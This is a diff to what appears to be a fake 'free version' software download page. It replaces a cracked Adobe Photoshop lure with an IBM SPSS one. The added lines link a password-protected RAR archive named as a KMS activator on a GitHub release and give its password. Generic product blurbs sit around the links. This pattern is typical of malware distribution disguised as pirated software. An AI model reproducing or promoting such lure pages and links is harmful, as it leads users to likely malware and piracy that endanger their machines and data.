@@ -1,27 +1,20 @@
-# <h1 align=center> Adobe Photoshop 2023 24.7.0.643 + Firefly AI 25.0.0.2254 FREE VERSION (NEWEST UPDATE)
-<h2 align=center><a href='https://inlnk.ru/84aLQ4'><img src='https://cdn.discordapp.com/attachments/1160267814955921539/1166374352879632496/1674337424_gas-kvas-com-p-risunok-adobe-photoshop-3d-36.png?ex=654a41c3&is=6537ccc3&hm=abe00510309e7e28ae2fc844e966442bc3f2b8b57797aed10a9c8c5f145d3899&'></a></h2>
+# <h1 align=center> IBM SPSS FREE VERSION (NEWEST UPDATE)
+<h2 align=center><a href='https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar'><img src='https://github.com/nedouman/nedorepo/assets/153565033/ba55c3aa-ad8b-47b6-9fe8-95fa3ae3e6a4'></a></h2>
 
-# <h1 align=center> DESCRIPTION OF ADOBE PHOTOSHOP + AI
-⚫️The future of Photoshop is here with Generative AI.
-Make any creative vision reality while keeping complete control over every concept with Adobe Firefly generative AI in Photoshop. Try select generative AI features in your browser right now with Photoshop.
+# <h1 align=center> DESCRIPTION OF IBM SPSS
+⚫️IBM SPSS Statistics is a powerful statistical analysis software widely used in various fields such as social sciences, market research, healthcare, and more. This robust toolset enables researchers, analysts, and data scientists to efficiently analyze data, derive insights, and make data-driven decisions. SPSS, an acronym for Statistical Package for the Social Sciences, provides an extensive range of statistical techniques and functionalities that cater to both beginners and advanced users in the field of data analysis.
 
-⚫️New background, no problem.
-Change the setting seamlessly on photos with generative AI. Simply select the background, type in a text prompt, and transport your subject from a local city street to a location across the globe, or across the galaxy.
+⚫️One of the key features of IBM SPSS Statistics is its vast array of statistical procedures and analysis capabilities. The software offers a comprehensive suite of tools for descriptive statistics, bivariate and multivariate analysis, regression analysis, factor analysis, and more. These functionalities empower users to explore data, uncover patterns, and generate statistical models to better understand complex relationships within their datasets.
 
-⚫️Go beyond the borders.
-Easily expand an image in any direction with Generative Expand. Select and drag the Crop tool beyond an image’s original borders to the desired size, and then click Generate. The expanded canvas will automatically fill with content that seamlessly blends with the existing image. Or type in a prompt to get a more specific result.
+⚫️Furthermore, SPSS boasts a user-friendly interface, making statistical analysis accessible to users with varying levels of expertise. Its intuitive graphical user interface (GUI) simplifies the process of importing, manipulating, and analyzing data, allowing users to perform statistical tests and generate visualizations without requiring extensive programming knowledge.
 
-⚫️Remove and replace content in a few steps.
-Cut out unwanted elements with ease. Simply select the object you want to remove and then select Generate (without adding any text to the prompt). Firefly will swap out telephone lines with unobstructed sky or replace stray strangers with flowers and foliage.
+⚫️Moreover, IBM SPSS Statistics emphasizes data visualization through its charting and graphing capabilities. Users can create a wide range of charts, histograms, scatterplots, and other visual representations to effectively communicate findings and insights derived from the analyzed data. These visualizations aid in presenting complex data in a more understandable and actionable format.
 
 # <h1 align=center>⚡️ DOWNLOAD LINK⚡️
-| Mod Version| ADOBE PHOTOSHOP - Version | Link |
+| Mod Version| IBM SPSS - Version | Link |
 |----------|-------------|-----------------|
-| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://inlnk.ru/84aLQ4) |
-| v24.0.0 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-| v23.3.9 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-| v23.0.5 | 2023.7.12 & 2023.7.11     | [Download](https://inlnk.ru/84aLQ4) |
-# <h1 align=center> ✅✅✅PASSWORD - 4455✅✅✅
+| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar) |
+| v24.0.0 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar) |
+# <h1 align=center> ✅✅✅PASSWORD - 2023✅✅✅
 
 # <h1 align=center> TURN ALL YOUR IDEAS INTO REALITY!
-
